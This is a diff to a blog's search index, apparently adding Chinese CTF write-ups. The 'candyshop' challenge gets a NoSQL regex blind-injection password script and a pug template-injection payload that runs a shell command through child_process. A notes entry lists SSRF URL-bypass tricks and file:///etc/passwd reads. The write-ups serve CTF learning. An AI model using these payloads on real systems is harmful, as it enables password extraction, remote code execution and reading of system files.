@@ -7684,6 +7684,15 @@ python黑魔法：
 
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">if</span> (preg_match(<span class="string">&#x27;#^&#x27;</span>.$regex.<span class="string">&#x27;(?:\?.*)?$#&#x27;</span>.(($case_sensitive) ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27;i&#x27;</span>), $url, $matches)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($ids <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;params[$k] = (array_key_exists($k, $matches)) ? urldecode($matches[$k]) : <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;regex = $regex;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<h2 id="candyshop"><a href="#candyshop" class="headerlink" title="candyshop"></a>candyshop</h2><p>随便注册了一个账号登录，发现后面需要用户是active才有进一步操作<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210919201435.png" alt="img" style="zoom:67%;"><br>所以还是要先注出这个密码，根据后面的一系列跳转，发现是一个nosql数据库<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210919203525.png" alt="img" style="zoom:67%;"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">chars&#x3D;&#39;0123456789abcdef&#39;</span><br><span class="line">ans&#x3D;&#39;&#39;</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;123.60.21.23:23333&#x2F;user&#x2F;login&quot;</span><br><span class="line">s&#x3D;requests.session()</span><br><span class="line">for pos in range(1,100):</span><br><span class="line">    for ch in chars:</span><br><span class="line">        data&#x3D;&#123;&#39;username&#39;:&#39;rabbit&#39;,&#39;password[$regex]&#39;:&#39;^&#39;+ans+ch+&#39;.*$&#39;&#125;</span><br><span class="line">        res&#x3D;s.post(url&#x3D;url,data&#x3D;data)</span><br><span class="line">        #print(data)</span><br><span class="line">        #print(res.text)</span><br><span class="line">        if &#39;Bad&#39; in res.text:</span><br><span class="line">            ans +&#x3D;ch</span><br><span class="line">            break</span><br><span class="line">        if ch&#x3D;&#x3D;&#39;f&#39;:</span><br><span class="line">            exit(0)</span><br><span class="line">    print(pos,ans)</span><br></pre></td></tr></table></figure>
+
+<p>跑出密码，继续追踪登录的路由:</p>
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210919212808.png" alt="img" style="zoom:67%;">
+发现这里有一个pug的模板渲染，且内容可控,pug渲染内容还有格式要求，这里要注意一下缩进
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;1&amp;candyname&#x3D;1&amp;address&#x3D;&#39;+flag&#x3D;global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&quot;cat+&#x2F;flag&quot;).toString()+a&#x3D;&#39;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
   </entry>
   <entry>
@@ -7729,6 +7738,35 @@ python黑魔法：
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url:file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">url:file:&#x2F;&#x2F;&#x2F;</span><br><span class="line">url:file:&#x2F;&#x2F;&#x2F;flag</span><br></pre></td></tr></table></figure>
 
 <p>这样就可以了</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>2021巅峰极客</title>
+    <url>/2021/09/19/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</url>
+    <content><![CDATA[<h2 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h2>]]></content>
+  </entry>
+  <entry>
+    <title>关于url的一些小trick</title>
+    <url>/2021/09/19/%E5%85%B3%E4%BA%8Eurl%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8Ftrick/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉最近遇到挺多ssrf的题目，然后就遇到了挺多这种url绕过的小trick，所以来复习一下</p>
+<p>1.访问路径的后缀被写死时<br>可以使用?a=后缀，或者#进行绕过<br>eg:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">以jpg结尾</span><br><span class="line">http:&#x2F;&#x2F;xxxx?a&#x3D;jpg</span><br><span class="line">此时访问的内容即为?a前面的东西</span><br></pre></td></tr></table></figure>
+
+<p>2.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">requests </span><br><span class="line"></span><br><span class="line">ipv6、ipv6 zone </span><br><span class="line"></span><br><span class="line">requests.get(http:&#x2F;&#x2F;[::FFFF:127.0.0.1]:23334) requests.get(http:&#x2F;&#x2F;[::FFFF:127.0.0.1%abc]:23334)</span><br><span class="line"></span><br><span class="line">host 支持  url  编码，端口号数字扩展位数</span><br><span class="line"></span><br><span class="line">requests.get(http:&#x2F;&#x2F;%61.baidu.com:00080).text</span><br></pre></td></tr></table></figure>
+
+<p>3.python的urllib支持读取任意文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;&#96;python # python3 # </span><br><span class="line">都相当于打开了 (http:&#x2F;&#x2F;a.baidu.com&#x2F;) urllib.request.urlopen(http:&#x2F;&#x2F;[a.baidu.com]).read() </span><br><span class="line">urllib.request.urlopen(&lt;http:&#x2F;&#x2F;[a.baidu.com]&gt;).read() </span><br><span class="line">urllib.request.urlopen(&lt;URL:http:&#x2F;&#x2F;[a.baidu.com]&gt;).read()</span><br><span class="line">urllib.request.urlopen(&#39;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line"># python2 </span><br><span class="line"># 都相当于打开了 [http:&#x2F;&#x2F;a.baidu.com](http:&#x2F;&#x2F;a.baidu.com&#x2F;) </span><br><span class="line">urllib.urlopen(&lt;URL:http:&#x2F;&#x2F;[a.baidu.com]&gt;).read() # 读文件  老东西了 </span><br><span class="line">urllib.urlopen(&#39;local_file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;).read() </span><br><span class="line">urllib.urlopen(&#39;local-file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;).read() # 相当于用 ftp 打开 </span><br><span class="line">urllib.urlopen(&#39;&#x2F;&#x2F;localhost:23334&#39;) urllib.urlopen(&#39;ftp:&#x2F;&#x2F;evil:23334&#39;) # </span><br><span class="line">若服务端返回 PASV 模式的服务器与端口，python 2 不做验证直接连接</span><br><span class="line">urllib.urlopen(&#39;local_file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">urllib.urlopen(&#39;local-file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure>
+
+<p>4.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHP:file_get_contents(&quot;file:&#x2F;&#x2F;localhost&#x2F;etc&#x2F;passwd&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>5.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java:new URL(&#39;url:file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>6.ipv6三个小trick</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x.1.ip6.name</span><br><span class="line">0--1.ipv6-literal.net</span><br><span class="line">2408-8207-1850-2a60--4c8.ipv6-literal.net</span><br></pre></td></tr></table></figure>
+
 ]]></content>
   </entry>
 </search>
